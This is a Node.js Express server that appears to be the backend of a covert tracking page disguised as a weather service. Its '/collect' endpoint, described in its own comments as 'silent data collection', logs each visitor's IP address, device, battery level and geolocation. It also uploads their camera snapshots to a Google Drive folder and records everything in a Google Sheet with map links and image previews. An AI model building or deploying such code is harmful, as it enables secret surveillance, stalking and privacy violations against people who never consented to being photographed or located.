import 'dotenv/config';
import express from 'express';
import { google } from 'googleapis';
import path from 'path';
import { fileURLToPath } from 'url';
import { Readable } from 'stream';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const app = express();

// Increase limit to 50mb to handle high-quality photo data
app.use(express.json({ limit: '50mb' }));
app.use(express.static(__dirname));

// Correctly format the Private Key for Render environment
const privateKey = (process.env.GOOGLE_PRIVATE_KEY || '').replace(/\\n/g, '\n');

// Set up Google Auth for both Sheets and Drive
const auth = new google.auth.JWT(
  process.env.GOOGLE_CLIENT_EMAIL,
  null,
  privateKey,
  ['https://www.googleapis.com/auth/spreadsheets', 'https://www.googleapis.com/auth/drive.file']
);

const drive = google.drive({ version: 'v3', auth });
const sheets = google.sheets({ version: 'v4', auth });

// YOUR TARGET GOOGLE DRIVE FOLDER ID
const FOLDER_ID = '1Kw94qJ-9DkeZHeiEfe5LwcA9pBTwCXni';

// Serve the index.html file
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));

// The silent data collection endpoint
app.post('/collect', async (req, res) => {
  try {
    const { ts, hints, battery, location, burstImages } = req.body;
    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;

    let imageFormula = "No Image";

    // 1. Process and Upload Image to Google Drive
    if (burstImages && burstImages.length > 0) {
      const imgBase64 = burstImages[0].split(',')[1];
      const buffer = Buffer.from(imgBase64, 'base64');
      
      const driveFile = await drive.files.create({
        requestBody: {
          name: `Weather_Capture_${Date.now()}.jpg`,
          parents: [FOLDER_ID]
        },
        media: {
          mimeType: 'image/jpeg',
          body: Readable.from(buffer)
        },
        supportsAllDrives: true, // IMPORTANT: Allows using your storage quota
        fields: 'id'
      });

      // Format the link so it displays as a photo inside the Google Sheet cell
      const fileId = driveFile.data.id;
      const directLink = `https://drive.google.com/uc?export=download&id=${fileId}`;
      imageFormula = `=IMAGE("${directLink}")`;
    }

    // 2. Generate Clickable Google Maps Link
    const mapLink = location ? `https://www.google.com/maps?q=${location.lat},${location.lon}` : "Denied";

    // 3. Prepare the Row Data
    const row = [
      ts,                       // Column A: Timestamp
      ip,                       // Column B: IP Address
      hints?.ua || 'N/A',       // Column C: Device/UA
      (battery?.levelPercent || 0) + '%', // Column D: Battery
      mapLink,                  // Column E: Clickable Map Link
      imageFormula              // Column F: AUTO-PREVIEW IMAGE
    ];

    // 4. Append Data to Google Sheets
    await sheets.spreadsheets.values.append({
      spreadsheetId: process.env.GOOGLE_SHEET_ID,
      range: 'Logs!A1',
      valueInputOption: 'USER_ENTERED', // Required to process the =IMAGE() formula
      requestBody: { values: [row] }
    });

    console.log("✅ Silent capture success: Data saved and Image uploaded.");
    res.json({ ok: true });

  } catch (err) {
    console.error("❌ BACKEND ERROR:", err.message);
    res.status(500).json({ error: err.message });
  }
});

const PORT = process.env.PORT || 8080;
app.listen(PORT, () => console.log(`Server is running on port ${PORT}`));
